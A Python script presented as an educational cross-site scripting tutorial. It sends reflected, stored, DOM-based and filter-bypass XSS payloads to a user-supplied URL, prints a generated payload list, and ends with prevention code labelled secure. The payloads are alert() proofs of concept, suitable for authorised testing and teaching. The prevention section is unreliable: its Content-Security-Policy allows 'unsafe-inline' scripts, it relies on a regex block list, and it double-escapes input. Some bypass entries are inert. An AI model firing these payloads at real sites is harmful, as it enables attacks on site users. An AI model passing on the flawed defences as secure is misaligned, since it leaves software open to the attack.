#!/usr/bin/env python3
"""
EDUCATIONAL PURPOSE ONLY - Cross-Site Scripting (XSS) Tutorial
This tutorial demonstrates XSS vulnerabilities for educational and defensive purposes.

LEGAL DISCLAIMER:
This code is for educational purposes only. Use only on systems you own or have explicit permission to test.
Unauthorized access to computer systems is illegal and unethical.
"""

import requests
import re
import base64
from urllib.parse import quote, unquote

class XSSTutorial:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        
    def reflected_xss(self):
        """
        Reflected XSS Tutorial
        Demonstrates how reflected XSS attacks work
        """
        print("=== Reflected XSS Tutorial ===")
        print("Target URL:", self.target_url)
        
        # Basic reflected XSS payload
        print("\n1. Basic Reflected XSS:")
        basic_payload = "<script>alert('XSS')</script>"
        print(f"Payload: {basic_payload}")
        
        response = self.session.get(f"{self.target_url}/search?q={quote(basic_payload)}")
        
        if "<script>" in response.text and "alert" in response.text:
            print("⚠️  VULNERABILITY DETECTED: Basic reflected XSS!")
        else:
            print("✅ No basic XSS vulnerability detected")
        
        # Advanced reflected XSS payloads
        print("\n2. Advanced Reflected XSS Payloads:")
        
        advanced_payloads = [
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>"
        ]
        
        for payload in advanced_payloads:
            response = self.session.get(f"{self.target_url}/search?q={quote(payload)}")
            if "alert" in response.text:
                print(f"⚠️  VULNERABILITY DETECTED with payload: {payload}")
                break
        else:
            print("✅ No advanced XSS vulnerabilities detected")
    
    def stored_xss(self):
        """
        Stored XSS Tutorial
        Demonstrates how stored XSS attacks work
        """
        print("\n=== Stored XSS Tutorial ===")
        
        # Stored XSS payload
        print("1. Stored XSS Attack:")
        stored_payload = "<script>alert('Stored XSS')</script>"
        print(f"Payload: {stored_payload}")
        
        # Submit the payload (simulating a comment or post)
        data = {
            'comment': stored_payload,
            'author': 'Test User',
            'submit': 'Submit'
        }
        
        response = self.session.post(f"{self.target_url}/comment", data=data)
        
        if response.status_code == 200:
            print("✅ Payload submitted successfully")
            
            # Check if payload is stored
            response = self.session.get(f"{self.target_url}/comments")
            
            if "<script>" in response.text and "alert" in response.text:
                print("⚠️  VULNERABILITY DETECTED: Stored XSS!")
                print("The malicious script is permanently stored and will execute for all users")
            else:
                print("✅ No stored XSS vulnerability detected")
        else:
            print("❌ Failed to submit payload")
    
    def dom_xss(self):
        """
        DOM-based XSS Tutorial
        Demonstrates how DOM-based XSS attacks work
        """
        print("\n=== DOM-based XSS Tutorial ===")
        
        # DOM XSS payloads
        print("1. DOM XSS Attack:")
        dom_payloads = [
            "#<script>alert('DOM XSS')</script>",
            "#javascript:alert('DOM XSS')",
            "#<img src=x onerror=alert('DOM XSS')>",
            "#<svg onload=alert('DOM XSS')>"
        ]
        
        for payload in dom_payloads:
            print(f"Testing payload: {payload}")
            response = self.session.get(f"{self.target_url}{payload}")
            
            # Check if the payload appears in the JavaScript context
            if "document.location.hash" in response.text and payload[1:] in response.text:
                print("⚠️  VULNERABILITY DETECTED: DOM-based XSS!")
                print("The application uses document.location.hash without proper sanitization")
                break
        else:
            print("✅ No DOM-based XSS vulnerabilities detected")
    
    def xss_filter_bypass(self):
        """
        XSS Filter Bypass Tutorial
        Demonstrates techniques to bypass XSS filters
        """
        print("\n=== XSS Filter Bypass Tutorial ===")
        
        # Filter bypass techniques
        bypass_techniques = [
            # Case variation
            "<ScRiPt>alert('XSS')</ScRiPt>",
            
            # Encoding techniques
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(\\'XSS\\')</script>",
            
            # Event handler bypass
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            
            # Attribute bypass
            "<input value=\"\" onclick=alert(1) type=image>",
            
            # Protocol bypass
            "javascript:alert(1)",
            "vbscript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            
            # Unicode bypass
            "<script>alert(\\u0058\\u0053\\u0053)</script>",
            
            # HTML entity bypass
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            
            # Null byte bypass
            "<script>alert('XSS')</script>\x00",
            
            # Double encoding
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            
            # Mixed encoding
            "<script>alert('XSS')</script>",
            
            # CSS-based XSS
            "<style>@import'javascript:alert(\"XSS\")';</style>",
            
            # MIME type confusion
            "<iframe src=\"data:text/html,<script>alert(1)</script>\"></iframe>"
        ]
        
        print("Testing various filter bypass techniques:")
        
        for technique in bypass_techniques:
            print(f"\nTesting: {technique}")
            response = self.session.get(f"{self.target_url}/search?q={quote(technique)}")
            
            # Check for successful bypass
            if "alert" in response.text and ("<script>" in response.text or "onerror" in response.text or "onload" in response.text):
                print("⚠️  FILTER BYPASSED: XSS vulnerability detected!")
                break
        else:
            print("✅ All filter bypass techniques failed")
    
    def xss_payload_generation(self):
        """
        XSS Payload Generation
        Demonstrates how to generate custom XSS payloads
        """
        print("\n=== XSS Payload Generation Tutorial ===")
        
        class XSSPayloadGenerator:
            def __init__(self):
                self.payloads = []
            
            def generate_basic_payloads(self):
                """Generate basic XSS payloads"""
                basic = [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "<iframe src=javascript:alert('XSS')></iframe>"
                ]
                self.payloads.extend(basic)
                return basic
            
            def generate_encoded_payloads(self):
                """Generate encoded XSS payloads"""
                encoded = [
                    "<script>alert(String.fromCharCode(88,83,83))</script>",
                    "<script>alert(\\'XSS\\')</script>",
                    "<script>alert(\\u0058\\u0053\\u0053)</script>"
                ]
                self.payloads.extend(encoded)
                return encoded
            
            def generate_event_handler_payloads(self):
                """Generate event handler XSS payloads"""
                event_handlers = [
                    "<body onload=alert('XSS')>",
                    "<input onfocus=alert('XSS') autofocus>",
                    "<select onfocus=alert('XSS') autofocus>",
                    "<textarea onfocus=alert('XSS') autofocus>",
                    "<keygen onfocus=alert('XSS') autofocus>",
                    "<video><source onerror=alert('XSS')>",
                    "<audio src=x onerror=alert('XSS')>"
                ]
                self.payloads.extend(event_handlers)
                return event_handlers
            
            def generate_all_payloads(self):
                """Generate all XSS payloads"""
                self.generate_basic_payloads()
                self.generate_encoded_payloads()
                self.generate_event_handler_payloads()
                return self.payloads
        
        generator = XSSPayloadGenerator()
        all_payloads = generator.generate_all_payloads()
        
        print(f"Generated {len(all_payloads)} XSS payloads:")
        for i, payload in enumerate(all_payloads, 1):
            print(f"{i:2d}. {payload}")
    
    def xss_prevention(self):
        """
        XSS Prevention Techniques
        Demonstrates secure coding practices to prevent XSS
        """
        print("\n=== XSS Prevention Tutorial ===")
        
        print("1. Output Encoding (Recommended):")
        prevention_code = '''
# SECURE: Output encoding in Python/Flask
from flask import Flask, render_template_string, escape, Markup

app = Flask(__name__)

def safe_render(user_input):
    # HTML encoding
    safe_input = escape(user_input)
    return render_template_string("{{ input }}", input=safe_input)

# For JavaScript context
def safe_js_render(user_input):
    # JavaScript encoding
    safe_input = user_input.replace('\\', '\\\\').replace('"', '\\"').replace("'", "\\'")
    return render_template_string("<script>var data = '{{ input }}';</script>", input=safe_input)

# For URL context
def safe_url_render(user_input):
    # URL encoding
    safe_input = quote(user_input)
    return render_template_string('<a href="{{ input }}">Link</a>', input=safe_input)
'''
        print(prevention_code)
        
        print("2. Content Security Policy (CSP):")
        csp_code = '''
# SECURE: Content Security Policy headers
from flask import Flask, make_response

app = Flask(__name__)

@app.after_request
def add_security_headers(response):
    # Content Security Policy
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "font-src 'self'; "
        "connect-src 'self'; "
        "media-src 'self'; "
        "object-src 'none'; "
        "child-src 'self'; "
        "frame-ancestors 'none'; "
        "form-action 'self'; "
        "upgrade-insecure-requests"
    )
    
    # Additional security headers
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    
    return response
'''
        print(csp_code)
        
        print("3. Input Validation:")
        validation_code = '''
# SECURE: Input validation and sanitization
import re
from html import escape

class InputValidator:
    def __init__(self):
        # Define allowed patterns
        self.allowed_patterns = {
            'email': r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$',
            'username': r'^[a-zA-Z0-9_-]{3,20}$',
            'name': r'^[a-zA-Z\\s]{2,50}$'
        }
        
        # Dangerous patterns to block
        self.dangerous_patterns = [
            r'<script[^>]*>.*?</script>',
            r'javascript:',
            r'vbscript:',
            r'data:text/html',
            r'<iframe[^>]*>.*?</iframe>',
            r'<object[^>]*>.*?</object>',
            r'<embed[^>]*>.*?</embed>'
        ]
    
    def validate_input(self, input_data, input_type='text'):
        """Validate and sanitize input"""
        if not input_data:
            return None
        
        # Check for dangerous patterns
        for pattern in self.dangerous_patterns:
            if re.search(pattern, input_data, re.IGNORECASE):
                raise ValueError(f"Dangerous pattern detected: {pattern}")
        
        # Type-specific validation
        if input_type in self.allowed_patterns:
            if not re.match(self.allowed_patterns[input_type], input_data):
                raise ValueError(f"Invalid {input_type} format")
        
        # HTML encode the input
        return escape(input_data)
    
    def sanitize_for_context(self, input_data, context='html'):
        """Sanitize input for specific context"""
        if context == 'html':
            return escape(input_data)
        elif context == 'javascript':
            return input_data.replace('\\', '\\\\').replace('"', '\\"').replace("'", "\\'")
        elif context == 'url':
            return quote(input_data)
        elif context == 'css':
            return input_data.replace('<', '\\<').replace('>', '\\>')
        else:
            return escape(input_data)

# Usage example
validator = InputValidator()
try:
    safe_input = validator.validate_input(user_input, 'text')
    safe_output = validator.sanitize_for_context(safe_input, 'html')
except ValueError as e:
    print(f"Input validation failed: {e}")
'''
        print(validation_code)
    
    def run_tutorial(self):
        """
        Run the complete XSS tutorial
        """
        print("🔒 Cross-Site Scripting (XSS) Tutorial - Educational Purpose Only")
        print("=" * 70)
        
        try:
            self.reflected_xss()
            self.stored_xss()
            self.dom_xss()
            self.xss_filter_bypass()
            self.xss_payload_generation()
            self.xss_prevention()
            
        except requests.exceptions.RequestException as e:
            print(f"❌ Connection error: {e}")
            print("Note: This tutorial requires a vulnerable test application")
        except Exception as e:
            print(f"❌ Error: {e}")
        
        print("\n" + "=" * 70)
        print("✅ Tutorial completed!")
        print("Remember: Always use these techniques responsibly and legally!")

def main():
    """
    Main function to run the XSS tutorial
    """
    print("Cross-Site Scripting (XSS) Tutorial - Educational Purpose Only")
    print("⚠️  WARNING: Use only on systems you own or have explicit permission to test!")
    
    # Example target (replace with your test environment)
    target_url = input("Enter target URL (or press Enter for localhost:8080): ").strip()
    if not target_url:
        target_url = "http://localhost:8080"
    
    tutorial = XSSTutorial(target_url)
    tutorial.run_tutorial()

if __name__ == "__main__":
    main()

